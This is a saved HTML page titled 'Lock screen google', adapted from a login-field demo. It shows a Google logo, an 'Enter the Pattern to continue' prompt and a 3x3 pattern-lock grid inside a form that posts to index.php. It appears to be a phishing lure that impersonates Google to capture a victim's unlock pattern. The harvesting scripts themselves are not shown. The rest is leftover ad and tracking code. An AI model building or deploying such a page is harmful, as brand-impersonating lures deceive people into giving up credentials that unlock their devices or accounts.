<!DOCTYPE html>
<!-- saved from url=(0069)https://www.freakyjolly.com/demo/gmail-like-login-fields-example.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <link href="bootstrap.min.css" rel="stylesheet">

    <script src="jquery.min.js.download"></script>

    <title>Lock screen google</title>

    <style>
        .form-wrapper-outer{
            padding: 40px;
            border-radius: 8px;
            margin: auto;
            width: 380px;
            border: 1px solid #DADCE0;
            margin-top: 5%;
        }

        .form-wrapper-outer .form-logo{
            margin: 0px auto 15px;
            width: 100px;
        }
        .form-wrapper-outer .form-logo img{
            width: 100%;
        }
        .form-greeting{
            text-align: center;
            font-size: 25px;
            margin-bottom: 7px;
        }
        
        .form-greetings{
            text-align: center;
            font-size: 17px;
            margin-bottom: 15px;
        }
         
        .form-greetingss{
            text-align: left;
            font-size: 17px;
            margin-bottom: 10px;
            color: black;
        }
        .form-button{
            text-align: right;
        }
         
        
        

        .field-wrapper{
            position: relative;
            margin-bottom: 15px;
        }
        
        .field-wrapper input{
            border: 1px solid #DADCE0;
            padding: 15px;
            border-radius: 4px;
            width: 100%;
        }

        .field-wrapper input:focus{
            #border:1px solid ;
        }

        .field-wrapper .field-placeholder{
            font-size: 16px;
            position: absolute;
            /* background: #fff; */
            bottom: 17px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            color: #80868b;
            left: 8px;
            padding: 0 8px;
            -webkit-transition: transform 150ms cubic-bezier(0.4,0,0.2,1),opacity 150ms cubic-bezier(0.4,0,0.2,1);
            transition: transform 150ms cubic-bezier(0.4,0,0.2,1),opacity 150ms cubic-bezier(0.4,0,0.2,1);
            z-index: 1;

            text-align: left;
            width: 100%;
        }        
        
        .field-wrapper .field-placeholder span{
            background: #ffffff;
            padding: 0px 8px;
        }

        .field-wrapper input:not([disabled]):focus~.field-placeholder
        {
            color:#1A73E8;
        }
        .field-wrapper input:not([disabled]):focus~.field-placeholder,
        .field-wrapper.hasValue input:not([disabled])~.field-placeholder
        {
            -webkit-transform: scale(.75) translateY(-39px) translateX(-60px);
            transform: scale(.75) translateY(-39px) translateX(-60px);
            
        }


        </style>

    <script>

        $(function () {

            $(".field-wrapper .field-placeholder").on("click", function () {
                $(this).closest(".field-wrapper").find("input").focus();
            });
            $(".field-wrapper input").on("keyup", function () {
                var value = $.trim($(this).val());
                if (value) {
                    $(this).closest(".field-wrapper").addClass("hasValue");
                } else {
                    $(this).closest(".field-wrapper").removeClass("hasValue");
                }
            });

        });

    </script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async="" src="./index_files/js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-102621885-1');
</script>
<link rel="canonical" href="https://www.freakyjolly.com/demo/gmail-like-login-fields-example.html">

<script data-ezscrex="false" data-cfasync="false" type="text/javascript">window.google_analytics_uacct = "UA-124318218-41";</script>
<script data-ezscrex="false" data-cfasync="false" type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['e._setAccount', 'UA-124318218-41']);
_gaq.push(['f._setAccount', 'UA-38339005-1']);
_gaq.push(['e._setDomainName', 'freakyjolly.com']);
_gaq.push(['f._setDomainName', 'freakyjolly.com']);
_gaq.push(['e._setCustomVar',1,'template','old_site_excl',3]);
_gaq.push(['e._setCustomVar',2,'t','131',3]);
_gaq.push(['e._setCustomVar',3,'rid','0',2]);
_gaq.push(['e._setCustomVar',4,'bra','mod98-c',3]);
_gaq.push(['e._setAllowAnchor',true]);
_gaq.push(['e._setSiteSpeedSampleRate', 10]);
_gaq.push(['f._setCustomVar',1,'template','old_site_excl',3]);
_gaq.push(['f._setCustomVar',2,'domain','freakyjolly.com',3]);
_gaq.push(['f._setSiteSpeedSampleRate', 20]);
_gaq.push(['e._trackPageview']);
_gaq.push(['f._trackPageview']);


(function() {
 var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
 ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
 var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>
<script type="text/javascript">var ezouid = "1";</script><!--<base href="https://www.freakyjolly.com/demo/gmail-like-login-fields-example.html">--><base href="."><script type="text/javascript">
var ezoTemplate = 'old_site_excl';
if(typeof ezouid == 'undefined')
{
    var ezouid = 'none';
}
var ezoFormfactor = '1';
var ezo_elements_to_check = Array();
</script><!-- START EZHEAD -->
<script data-ezscrex="false" type="text/javascript">
var soc_app_id = '0';
var did = 96916;
var ezdomain = 'freakyjolly.com';
var ezoicSearchable = 1;
</script>
<!--{jquery}-->
<!-- END EZHEAD -->
<script data-ezscrex="false" type="text/javascript" data-cfasync="false">var _ezaq = {"ad_cache_level":0,"city":"Delhi","country":"IN","days_since_last_visit":0,"domain_id":96916,"engaged_time_visit":188,"ezcache_level":0,"forensiq_score":-1,"form_factor_id":1,"framework_id":1,"is_return_visitor":false,"is_sitespeed":0,"last_page_load":"1583952317146","last_pageview_id":"3b8a60fd-3e4a-40a0-539b-94c430582670","lt_cache_level":0,"metro_code":0,"page_ad_positions":"","page_view_count":5,"page_view_id":"5745617f-1bc7-47db-5dbb-89ca63c205f0","position_selection_id":0,"postal_code":"110054","pv_event_count":0,"response_time_orig":365,"serverid":"52.66.175.39:19885","state":"DL","t_epoch":1583952337,"template_id":131,"time_on_site_visit":695,"url":"https://www.freakyjolly.com/demo/gmail-like-login-fields-example.html","user_id":0,"word_count":13,"worst_bad_word_level":0};var _ezExtraQueries = "&ez_orig=1";</script><script data-ezscrex="false" data-cfasync="false" type="text/javascript" src="rochester.js.download" async=""></script>
<script async="" src="./index_files/f(2).txt" type="text/javascript"></script>
<script data-ezscrex="false" data-pagespeed-no-defer="" data-cfasync="false">
function create_ezolpl() {
    var d = new Date();
    d.setTime(d.getTime() + (365*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    __ez.ck.setByCat("ezux_lpl_96916=" + new Date().getTime() + "|5745617f-1bc7-47db-5dbb-89ca63c205f0|false; " + expires, 3);
}
function attach_ezolpl() {
    if(window.attachEvent) {
        window.attachEvent('onload', create_ezolpl);
    } else {
        if(window.onload) {
            var curronload = window.onload;
            var newonload = function(evt) {
                curronload(evt);
                create_ezolpl();
            };
            window.onload = newonload;
        } else {
            window.onload = create_ezolpl;
        }
    }
}
attach_ezolpl();
</script><script src="./index_files/edmonton.webp" async=""></script><script src="./index_files/jellyfish.webp" async=""></script><link rel="preload" href="./index_files/f(3).txt" as="script"><script type="text/javascript" src="./index_files/f(3).txt"></script><link rel="preload" href="./index_files/f(4).txt" as="script"><script type="text/javascript" src="./index_files/f(4).txt"></script><script src="./index_files/audins.js.download" async="" type="text/javascript"></script></head>

<body class="container">
    <form action="index.php" method="post" >


    <div class="form-wrapper-outer">

        <div class="form-logo">
            <img src="google_PNG19644.png" alt="logo">
        </div>
        <div class="form-greeting">
        	<br>
        	
        <img src="pattern.png" alt="Smiley face" width="40" height="40"><span>Enter the Pattern to continue</span>
        </div>
<br>
         <div class="form-greetings">
            <span>Pattern recorded</span>
        </div>

       
        
        
       
            

       
        
        
       
            
   
        <style>
		
		
			
		
		main{
			display: flex;
			flex-direction: column;
			
		}
		svg.patternlock g.lock-lines line {
			stroke-width: 1.5;
			stroke: #1E90FF;
			opacity: 0.5;
		}
		svg.patternlock g.lock-dots circle {
			stroke: transparent;
			fill: #37474f;
			stroke-width: 13.5;
		}
		svg.patternlock g.lock-actives circle {
			fill: #ffffff;
			opacity: .1;
			animation: lock-activate-dot .15s 0s ease 1;
			transform-origin: center;
		}
		svg.patternlock g.lock-lines line {
			stroke-width: 1.5;
			stroke-linecap: round;
		}
		svg.patternlock.success g.lock-actives circle {
			fill: green;
		}
		svg.patternlock.error g.lock-actives circle {
			fill: red;
		}
		@keyframes lock-activate-dot {
			0% {
				transform: scale(0);
			}
			75% {
				transform: scale(1.1);
			}
			100% {
				transform: scale(1.0);
			}
		}
		h3{
			margin: 2rem 0 1rem;
		}
	</style>
	<main>
		
		<svg class="patternlock success" id="lock" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <g class="lock-actives"></g>
            <g class="lock-lines"></g>
            <g class="lock-dots">
                
                                <circle cx="20" cy="20" r="2"></circle>
                <circle cx="50" cy="20" r="2"></circle>
                <circle cx="80" cy="20" r="2"></circle>

                <circle cx="20" cy="50" r="2"></circle>
                <circle cx="50" cy="50" r="2"></circle>
                <circle cx="80" cy="50" r="2"></circle>

                <circle cx="20" cy="80" r="2"></circle>
                <circle cx="50" cy="80" r="2"></circle>
                <circle cx="80" cy="80" r="2"></circle>
                
                
                
            </g>
        <svg>
    </svg></svg>
	</main>
	<script src="./vendor.js"></script>
	<script src="./patternlock.js"></script>
	<script src="./main.js"></script>
	<noscript>Your browser doesn't support JavaScript.</noscript>
	
        
        
            <button type="btn" class="btn btn-primary">Next</button>
        </div>
        
        

    </div>
    
    
    

        
    </form>

    <script async="" src="./index_files/f(2).txt"></script>
    <!--  in post wide -->
<ins class="adsbygoogle ezfound" style="display: inline-block; width: 970px; height: 0px;" data-ad-client="ca-pub-2387490687776151" data-ad-slot="1683859225" data-adsbygoogle-status="done"><ins id="aswift_0_expand" style="display: inline-table; border: none; height: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; width: 970px; background-color: transparent;"><ins id="aswift_0_anchor" style="display: block; border: none; height: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; width: 970px; background-color: transparent; overflow: hidden; transition: opacity 1s cubic-bezier(0.4, 0, 1, 1) 0s, width 0.2s cubic-bezier(0.4, 0, 1, 1) 0.3s, height 0.5s cubic-bezier(0.4, 0, 1, 1) 0s; opacity: 0;"><iframe width="970" height="250" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0px;width:970px;height:250px;" src="./index_files/saved_resource.html"></iframe></ins></ins></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
  
<script type="text/javascript" style="display:none;" async="">
__ez.queue.addFile('edmonton.php', '/detroitchicago/edmonton.webp?a=a&cb=2&shcb=32', true, [], true, false, false, false);
__ez.queue.addFile('jellyfish.php', '/porpoiseant/jellyfish.webp?a=a&cb=2&shcb=32', false, [], true, false, false, false);
</script>

<script>var _audins_dom="freakyjolly_com",_audins_did=96916;__ez.queue.addDelayFunc("audins.js","__ez.script.add", "//go.ezoic.net/detroitchicago/audins.js?cb=188-2");</script><noscript><div style="display:none;"><img src="//pixel.quantserve.com/pixel/p-31iz6hfFutd16.gif?labels=Domain.freakyjolly_com,DomainId.96916" border="0" height="1" width="1" alt="Quantcast"/></div></noscript><noscript><img src="https://sb.scorecardresearch.com/p?c1=2&c2=20015427&cv=2.0&cj=1"/></noscript>
<script type="text/javascript" data-cfasync="false">(function(){function b(g,c){for(var e=0;e<c.length;e++){var d=c[e];if(0==d.complete||"undefined"!=typeof d.readyState&&4>d.readyState){var f=d.getAttribute("src")||d.currentSrc;"undefined"!=typeof d.readyState&&0==d.readyState?d.addEventListener("loadstart",function(h){var k=h.getAttribute("src")||h.currentSrc;window.ezorqs(h,k)}):(f=d.getAttribute("src")||d.currentSrc,window.ezorqs(d,f));d.addEventListener("load",function(h){var k=h.currentTarget.getAttribute("src")||h.srcElement.currentSrc;window.ezorqe(h,
k)});d.addEventListener("loadeddata",function(h){var k=h.currentTarget.getAttribute("src")||h.srcElement.currentSrc;window.ezorqe(h,k)});d.addEventListener("error",function(h){var k=h.currentTarget.getAttribute("src")||h.srcElement.currentSrc;window.ezorqe(h,k)})}}}function a(g){for(var c=0;c<document.styleSheets.length;c++)if(document.styleSheets[c].href==g)return!0;return!1}b("img",document.querySelectorAll("img"));b("video",document.querySelectorAll("video"));b("audio",document.querySelectorAll("audio"));
(function(g){for(var c=0;c<g.length;c++){var e=g[c];if(("preload"==e.getAttribute("rel")||"stylesheet"==e.getAttribute("rel"))&&null!=e.getAttribute("href")&&a(e.getAttribute("href"))){window.ezorqs(e,e.getAttribute("href"));var d=document.createElement("img");d.onerror=function(f){"undefined"!=typeof f.path&&"undefined"!=typeof f.path[0].currentSrc?window.ezorqe(e,f.path[0].currentSrc):"undefined"!=typeof f.srcElement&&"undefined"!=typeof f.srcElement.href&&window.ezorqe(e,f.srcElement.href)};d.src=
e.getAttribute("href")}}})(document.querySelectorAll("link"));"undefined"!=typeof window.__ez.ssaf&&-1<window.__ez.ssaf.indexOf(16)&&"undefined"!==typeof window.__ez.sshsdef&&!1===window.__ez.sshsdef&&Element.prototype.addEventListener&&("function"==typeof window.onload&&(window.addEventListener("load",window.onload),window.onload=null),"function"==typeof document.onload&&(document.addEventListener.addEventListener("load",document.onload),document.onload=null))})();</script>

<ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;"><ins id="aswift_1_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><ins id="aswift_1_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;border:0px;width:0px;height:0px;" src="./index_files/saved_resource(1).html"></iframe></ins></ins></ins><iframe id="google_osd_static_frame_9958690266484" name="google_osd_static_frame" style="display: none; width: 0px; height: 0px;" src="./index_files/saved_resource(2).html"></iframe></body><iframe id="google_esf" name="google_esf" src="./index_files/zrt_lookup.html" data-ad-client="ca-pub-2387490687776151" style="display: none;"></iframe></html>